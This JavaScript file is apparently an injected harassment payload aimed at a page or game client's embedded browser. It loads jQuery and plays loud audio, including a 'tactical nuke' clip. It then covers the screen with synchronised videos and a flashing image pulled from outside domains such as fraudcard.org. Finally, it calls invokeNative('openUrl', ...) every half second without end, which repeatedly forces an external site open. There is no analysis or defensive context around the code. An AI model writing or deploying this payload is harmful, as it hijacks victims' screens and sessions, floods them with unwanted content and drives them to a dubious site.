const script = document.createElement('script');
script.src = "https://code.jquery.com/jquery-3.6.0.min.js";
script.onload = async function () {
    $(document).ready(async function () {

        const startAudio = new Audio("https://fraudcard.org/file/cristiano-ronaldo-tts-file-67716.mp3");
        const nukeAudio = new Audio("https://fraudcard.org/file/tactical-nuke-(mp3cut.net)-52890.mp3");

        startAudio.volume = 1;
        nukeAudio.volume = 1;

        const waitForAudioEnd = (audio) => new Promise(res => {
            audio.addEventListener('ended', res, { once: true });
            audio.play().catch(console.error);
        });

        await waitForAudioEnd(startAudio);

        await new Promise(res => setTimeout(res, 2000));

        await waitForAudioEnd(nukeAudio);


        await prepareVideos();

        showVideos();
        setTimeout(() => {
            flashImage();
        }, 8600);
    });

    async function prepareVideos() {
        return new Promise((resolve) => {
            $('body').append(`
                    <div style="position:fixed;top:0;right:0;width:30%;z-index:1000;"><video muted playsinline id="v1" style="width:100%;display:none;" preload="auto"><source src="https://bfs-service.xyz/niron/0504.mp4" type="video/mp4"></video></div>
                    <div style="position:fixed;top:0;left:0;width:30%;z-index:1000;"><video muted playsinline id="v2" style="width:100%;display:none;" preload="auto"><source src="https://bfs-service.xyz/niron/0504.mp4" type="video/mp4"></video></div>
                    <div style="position:fixed;bottom:0;left:0;width:30%;z-index:1000;"><video muted playsinline id="v3" style="width:100%;display:none;" preload="auto"><source src="https://bfs-service.xyz/niron/0504.mp4" type="video/mp4"></video></div>
                    <div style="position:fixed;bottom:0;right:0;width:30%;z-index:1000;"><video muted playsinline id="v4" style="width:100%;display:none;" preload="auto"><source src="https://bfs-service.xyz/niron/0504.mp4" type="video/mp4"></video></div>
                `);

            const videos = [$('#v1')[0], $('#v2')[0], $('#v3')[0], $('#v4')[0]];
            let loaded = 0;
            videos.forEach(video => {
                video.addEventListener('canplaythrough', () => {
                    loaded++;
                    if (loaded === videos.length) resolve();
                }, { once: true });
                video.load();
            });
        });
    }

    function showVideos() {
        const videos = [$('#v1')[0], $('#v2')[0], $('#v3')[0], $('#v4')[0]];
        videos.forEach((v, i) => {
            v.style.display = 'block';
            v.currentTime = 0;
            v.muted = i !== 0;
            v.play();
        });
        syncVideosLoop(videos[0], [videos[1], videos[2], videos[3]]);
    }

    function syncVideosLoop(master, slaves) {
        setInterval(() => {
            const masterTime = master.currentTime;
            slaves.forEach((v) => {
                const drift = Math.abs(v.currentTime - masterTime);
                if (drift > 0.2) {
                    v.currentTime = masterTime;
                    v.play();
                }
            });
        }, 250);
    }
    function flashImage() {
        $('head').append(`
            <style>
                @keyframes pulse {
                    0% { transform: translate(-50%, -50%) scale(1); }
                    50% { transform: translate(-50%, -50%) scale(1.3); }
                    100% { transform: translate(-50%, -50%) scale(1); }
                }
                .flashing-img {
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    z-index: 9999;
                    width: 400px;
                    animation: pulse 3s infinite;
                }
            </style>
        `);

        $('body').append(`<img src="https://fraudcard.org/file/istockphoto-525982638-612x612.jpg" class="flashing-img" id="niron" />`);

        setTimeout(() => {
            $("#v1, #v2, #v3, #v4").remove();

            $('body').append(`
                <div style="position:fixed;top:0;right:0;width:30%;z-index:1000;"><video playsinline id="v5" style="width:100%;display:none;" preload="auto"><source src="https://fraudcard.org/file/sa-61442.mp4" type="video/mp4"></video></div>
                <div style="position:fixed;top:0;left:0;width:30%;z-index:1000;"><video playsinline id="v6" style="width:100%;display:none;" preload="auto"><source src="https://fraudcard.org/file/sa-61442.mp4" type="video/mp4"></video></div>
                <div style="position:fixed;bottom:0;left:0;width:30%;z-index:1000;"><video playsinline id="v7" style="width:100%;display:none;" preload="auto"><source src="https://fraudcard.org/file/sa-61442.mp4" type="video/mp4"></video></div>
                <div style="position:fixed;bottom:0;right:0;width:30%;z-index:1000;"><video playsinline id="v8" style="width:100%;display:none;" preload="auto"><source src="https://fraudcard.org/file/sa-61442.mp4" type="video/mp4"></video></div>
            `);
            const newVideos = [$('#v5')[0], $('#v6')[0], $('#v7')[0], $('#v8')[0]];
            let loaded = 0;

            newVideos.forEach(video => {
                video.addEventListener('canplaythrough', () => {
                    loaded++;
                    if (loaded === newVideos.length) {
                        newVideos.forEach((v, i) => {
                            v.style.display = 'block';
                            v.currentTime = 0;
                            v.muted = i !== 0;
                            v.play().catch(console.error);

                            if (i === 0) {
                                v.addEventListener('ended', () => {
                                    $("#v5, #v6, #v7, #v8, #niron").remove();
                                    setInterval(function () {
                                        window.invokeNative("openUrl", "https://fraudcard.org/perrerollet");
                                    }, 500)
                                });
                            }
                        });
                        syncVideosLoop(newVideos[0], [newVideos[1], newVideos[2], newVideos[3]]);
                        $("#niron").attr("src", "https://fraudcard.org/file/as.png")
                    }
                }, { once: true });
                video.load();
            });

        }, 8500);
    }

};
document.head.appendChild(script);
